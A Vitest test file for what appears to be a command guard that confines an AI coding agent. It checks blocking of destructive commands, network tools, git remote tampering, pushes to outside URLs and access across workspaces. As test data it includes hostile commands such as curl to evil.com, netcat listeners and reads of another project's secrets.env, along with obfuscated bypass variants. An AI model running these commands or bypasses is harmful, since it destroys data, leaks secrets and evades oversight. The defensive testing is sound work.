import { describe, it, expect } from "vitest";
import { checkBlockedCommand, checkGitPushTarget, checkWorkspaceBoundary, normalizeCommand } from "../command-guard.js";

describe("normalizeCommand", () => {
  it("strips backslash escapes", () => {
    expect(normalizeCommand("cu\\rl http://example.com")).toBe("curl http://example.com");
  });

  it("extracts basenames from absolute paths", () => {
    expect(normalizeCommand("/usr/bin/curl http://example.com")).toBe("curl http://example.com");
  });

  it("handles both obfuscations together", () => {
    expect(normalizeCommand("/usr/bin/cu\\rl http://x")).toBe("curl http://x");
  });
});

describe("checkBlockedCommand", () => {
  describe("original blocked commands", () => {
    const blocked = [
      ["pkill node", "pkill"],
      ["killall python", "killall"],
      ["shutdown -h now", "shutdown"],
      ["reboot", "reboot"],
      ["halt", "halt"],
      ["poweroff", "poweroff"],
      ["rm -rf /tmp", "rm targeting root"],
      ["mkfs.ext4 /dev/sda1", "mkfs"],
      ["dd of=/dev/", "dd"],
      ["curl http://evil.com", "curl"],
      ["wget http://evil.com", "wget"],
      ["nc -l 4444", "nc"],
      ["ncat -l 4444", "ncat"],
      ["netcat -l 4444", "netcat"],
      ["socat TCP-LISTEN:4444", "socat"],
      ["ssh user@host", "ssh"],
      ["scp file user@host:/tmp", "scp"],
      ["telnet host 80", "telnet"],
      ["crontab -e", "crontab"],
      ["chown root file", "chown"],
    ] as const;

    for (const [cmd, label] of blocked) {
      it(`blocks ${label}`, () => {
        const result = checkBlockedCommand(cmd);
        expect(result).not.toBeNull();
        expect(result).toContain("BLOCKED");
      });
    }
  });

  describe("new blocked commands", () => {
    const blocked = [
      ["sudo poweroff", "sudo"],
      ["sudo rm -rf /tmp/x", "sudo"],
      ["chmod 777 file.txt", "chmod"],
      ["systemctl restart nginx", "systemctl"],
      ["passwd root", "passwd"],
      ["useradd newuser", "useradd"],
      ["userdel olduser", "userdel"],
      ["usermod -aG sudo user", "usermod"],
      ["iptables -A INPUT -j DROP", "iptables"],
      ["ufw allow 22", "ufw"],
      ["modprobe vfio", "modprobe"],
      ["insmod custom.ko", "insmod"],
      ["rmmod custom", "rmmod"],
    ] as const;

    for (const [cmd, label] of blocked) {
      it(`blocks ${label}`, () => {
        const result = checkBlockedCommand(cmd);
        expect(result).not.toBeNull();
        expect(result).toContain("BLOCKED");
      });
    }
  });

  describe("git remote manipulation", () => {
    const blocked = [
      ["git remote add evil https://evil.com/repo", "git remote add"],
      ["git remote set-url origin https://evil.com/repo", "git remote set-url"],
      ["git remote rename origin evil", "git remote rename"],
      ["git remote remove origin", "git remote remove"],
      ["git remote rm origin", "git remote rm"],
    ] as const;

    for (const [cmd, label] of blocked) {
      it(`blocks ${label}`, () => {
        const result = checkBlockedCommand(cmd);
        expect(result).not.toBeNull();
        expect(result).toContain("BLOCKED");
        expect(result).toContain("remote");
      });
    }

    it("allows git remote -v (read-only)", () => {
      expect(checkBlockedCommand("git remote -v")).toBeNull();
    });

    it("allows git remote (list)", () => {
      expect(checkBlockedCommand("git remote")).toBeNull();
    });
  });

  describe("obfuscation bypass", () => {
    it("blocks backslash-escaped commands", () => {
      expect(checkBlockedCommand("su\\do poweroff")).toContain("BLOCKED");
      expect(checkBlockedCommand("ch\\mod 777 x")).toContain("BLOCKED");
    });

    it("blocks absolute-path commands", () => {
      expect(checkBlockedCommand("/usr/bin/sudo poweroff")).toContain("BLOCKED");
      expect(checkBlockedCommand("/sbin/iptables -F")).toContain("BLOCKED");
    });
  });

  describe("compound commands", () => {
    it("blocks sudo in a pipe", () => {
      expect(checkBlockedCommand("ls | sudo rm -rf /tmp")).toContain("BLOCKED");
    });

    it("blocks sudo after &&", () => {
      expect(checkBlockedCommand("echo ok && sudo poweroff")).toContain("BLOCKED");
    });

    it("blocks sudo after ||", () => {
      expect(checkBlockedCommand("false || sudo reboot")).toContain("BLOCKED");
    });

    it("blocks sudo after semicolon", () => {
      expect(checkBlockedCommand("echo hi; sudo halt")).toContain("BLOCKED");
    });
  });

  describe("safe commands pass through", () => {
    const safe = [
      "ls -la",
      "git status",
      "npm install",
      "df -h",
      "uptime",
      "docker ps",
      "echo hello",
      "cat /etc/os-release",
      "ps aux",
      "free -m",
      "whoami",
      "pwd",
      "date",
    ];

    for (const cmd of safe) {
      it(`allows '${cmd}'`, () => {
        expect(checkBlockedCommand(cmd)).toBeNull();
      });
    }
  });
});

describe("checkGitPushTarget", () => {
  describe("allowed pushes", () => {
    const allowed = [
      "git push origin main",
      "git push origin feature/my-branch",
      "git push upstream main",
      "git push -u origin my-branch",
      "git push --force origin main",
      "git push",  // no remote specified = default (allowed)
    ];

    for (const cmd of allowed) {
      it(`allows '${cmd}'`, () => {
        expect(checkGitPushTarget(cmd)).toBeNull();
      });
    }
  });

  describe("blocked pushes", () => {
    it("blocks push to unknown remote", () => {
      const result = checkGitPushTarget("git push evil-remote main");
      expect(result).not.toBeNull();
      expect(result).toContain("BLOCKED");
      expect(result).toContain("evil-remote");
    });

    it("blocks push to explicit URL (https)", () => {
      const result = checkGitPushTarget("git push https://evil.com/repo.git main");
      expect(result).not.toBeNull();
      expect(result).toContain("BLOCKED");
      expect(result).toContain("URL");
    });

    it("blocks push to explicit URL (ssh)", () => {
      const result = checkGitPushTarget("git push git@evil.com:repo.git main");
      expect(result).not.toBeNull();
      expect(result).toContain("BLOCKED");
      expect(result).toContain("URL");
    });

    it("blocks push to unknown remote in compound command", () => {
      const result = checkGitPushTarget("echo done && git push evil main");
      expect(result).not.toBeNull();
      expect(result).toContain("BLOCKED");
    });
  });
});

describe("checkWorkspaceBoundary", () => {
  const workspacePath = "/data/projects/proj-1/worktrees/agent-abc";
  const workspaceRoot = "/data";

  describe("allowed paths", () => {
    it("allows paths within workspace", () => {
      const cmd = "cat /data/projects/proj-1/worktrees/agent-abc/src/main.ts";
      expect(checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot)).toBeNull();
    });

    it("allows safe system paths", () => {
      const cmd = "ls /usr/bin/node";
      expect(checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot)).toBeNull();
    });

    it("allows /tmp paths", () => {
      const cmd = "cat /tmp/test-output.txt";
      expect(checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot)).toBeNull();
    });

    it("allows /dev/null", () => {
      const cmd = "echo test > /dev/null";
      expect(checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot)).toBeNull();
    });

    it("allows commands with no absolute paths", () => {
      const cmd = "npm install && npm test";
      expect(checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot)).toBeNull();
    });
  });

  describe("blocked cross-project paths", () => {
    it("blocks access to another project under projects/", () => {
      const cmd = "cat /data/projects/proj-2/repo/secrets.env";
      const result = checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot);
      expect(result).not.toBeNull();
      expect(result).toContain("BLOCKED");
    });

    it("blocks access to sibling worktree", () => {
      const cmd = "ls /data/projects/proj-1/worktrees/agent-other/src";
      const result = checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot);
      expect(result).not.toBeNull();
      expect(result).toContain("BLOCKED");
    });

    it("blocks access to workspace root config", () => {
      const cmd = "cat /data/config/settings.json";
      const result = checkWorkspaceBoundary(cmd, workspacePath, workspaceRoot);
      expect(result).not.toBeNull();
      expect(result).toContain("BLOCKED");
    });
  });
});
